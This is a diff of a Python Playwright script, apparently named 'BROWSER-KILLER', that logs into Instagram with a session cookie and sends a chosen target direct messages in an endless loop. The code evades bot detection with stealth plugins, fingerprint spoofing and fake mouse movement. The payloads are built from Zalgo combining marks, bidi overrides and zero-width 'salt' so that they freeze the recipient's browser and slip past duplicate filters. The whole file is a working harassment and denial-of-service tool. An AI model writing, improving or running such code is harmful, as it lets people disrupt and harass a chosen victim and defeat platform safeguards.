@@ -1,81 +1,84 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (PLAYWRIGHT ULTIMATE)
-# 📅 STATUS: IMPORT-FIXED | 100-LINE PAPA | STABILITY-MAX
+# 🚀 PROJECT: PRAVEER.OWNS (BROWSER-KILLER)
+# 📅 STATUS: 1-ID-ULTRA-SAFE | DESKTOP-LAG | PLAYWRIGHT
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
-# --- THE FIX: Import the function specifically ---
-from playwright_stealth import stealth
+from playwright_stealth import stealth as stealth_func
 
 def get_kernel_stop_payload(target_name):
+    """Targets Desktop Browser Layout Engines."""
     u_id = random.randint(10000, 99999)
-    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=5))
+    # Salted invisible markers to bypass duplicate filters
+    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
     header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
     
-    z_tower = "̸" * 30 
-    width_bomb = "\u2800\u00A0" * 35
+    # 🏗️ EXTREME DENSITY (120 Zalgo marks per line)
+    # This creates a 'Vertical Pillar' that overlaps 10+ lines of text
+    z_tower = "̸" * 120 
+    width_bomb = "\u2800\u00A0" * 45
     lines = [header]
-    for i in range(100):
+    
+    for i in range(85): # 85 lines keeps us safely under 10k chars with high density
+        # BIDI Overrides: Forces the browser to re-calculate text direction constantly
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        noise = "".join(random.choices("XY12", k=2))
-        # Building the 100-line block
-        lines.append(f"{width_bomb}{prefix}ＰＡＰＡ_{noise}{z_tower}")
-    return "\n".join(lines)[:9990]
+        noise = "".join(random.choices("0123456789", k=2))
+        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
+    
+    return "\n".join(lines)[:9980]
 
 async def agent_blitz(machine_id, cookie_list, target_id, target_name):
-    cookie_index = (machine_id - 1) % len(cookie_list)
-    current_cookie = cookie_list[cookie_index].strip()
+    current_cookie = cookie_list[0].strip()
 
     async with async_playwright() as p:
         browser = await p.chromium.launch(headless=True)
-        # 🎭 Create context with high-end desktop fingerprint
+        # 🎭 Desktop Fingerprint (Wide Viewport)
         context = await browser.new_context(
             user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
             viewport={'width': 1920, 'height': 1080}
         )
         page = await context.new_page()
-        
-        # ✅ THE CALL: Now it targets the function correctly
-        await stealth(page)
+        await stealth_func(page)
         
         try:
-            print(f"📡 [M{machine_id}] Establishing Domain...")
+            print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
             await page.goto("https://www.instagram.com/robots.txt")
             await context.add_cookies([{
-                "name": "sessionid",
-                "value": current_cookie,
-                "domain": ".instagram.com",
-                "path": "/",
-                "secure": True
+                "name": "sessionid", "value": current_cookie, 
+                "domain": ".instagram.com", "path": "/", "secure": True
             }])
 
-            print(f"📡 [M{machine_id}] Entering Chat...")
-            # We use 'domcontentloaded' to start the script before heavy ads load
+            print(f"📡 [M{machine_id}] Loading Target Chat...")
             await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
             
             box_selector = "//div[@role='textbox']"
-            await page.wait_for_selector(box_selector, timeout=90000)
-            print(f"✅ [M{machine_id}] PAPA IS ON TOP. Target Locked.")
+            await page.wait_for_selector(box_selector, timeout=60000)
 
             while True:
-                # 🔥 DOUBLE-PULSE WAVE
-                for _ in range(2):
-                    payload = get_kernel_stop_payload(target_name)
-                    # Playwright 'fill' is immune to the 'stale element' errors of Selenium
-                    await page.fill(box_selector, payload)
-                    await page.keyboard.press("Enter")
-                    print(f"💀 [M{machine_id}] 100-Line Pulse Delivered.")
-                    await asyncio.sleep(1.5)
+                # 🔥 THE STRIKE
+                payload = get_kernel_stop_payload(target_name)
+                
+                await page.click(box_selector)
+                # 'Fill' is better for large payloads in Playwright
+                await page.fill(box_selector, payload)
+                await asyncio.sleep(random.uniform(3, 5)) # Human-like pause
+                await page.keyboard.press("Enter")
+                
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered. Target UI Locked.")
 
-                # Stealth Jitter: Balance between freezing them and keeping account alive
-                await asyncio.sleep(random.uniform(18, 26))
-
-                # Periodic refresh to clear the DOM and prevent local browser crash
-                if random.random() < 0.1:
-                    await page.reload(wait_until="domcontentloaded")
+                # ⏳ THE 'SAFETY GAP' (120-150 seconds)
+                # With 1 ID, you MUST wait 2+ mins. 
+                # The browser will stay frozen the entire time because of the Zalgo weight.
+                sleep_time = random.uniform(120, 150)
+                print(f"⏳ Cooling down for {int(sleep_time)}s to keep ID safe...")
+                
+                # Mimic active tab behavior during sleep
+                for _ in range(4):
+                    await asyncio.sleep(sleep_time / 4)
+                    await page.mouse.move(random.randint(0, 500), random.randint(0, 500))
 
         except Exception as e:
-            print(f"❌ [M{machine_id}] Error in Strike: {str(e)[:60]}")
+            print(f"❌ [M{machine_id}] Safety Stop: {str(e)[:60]}")
             await browser.close()
             sys.exit(1)
 
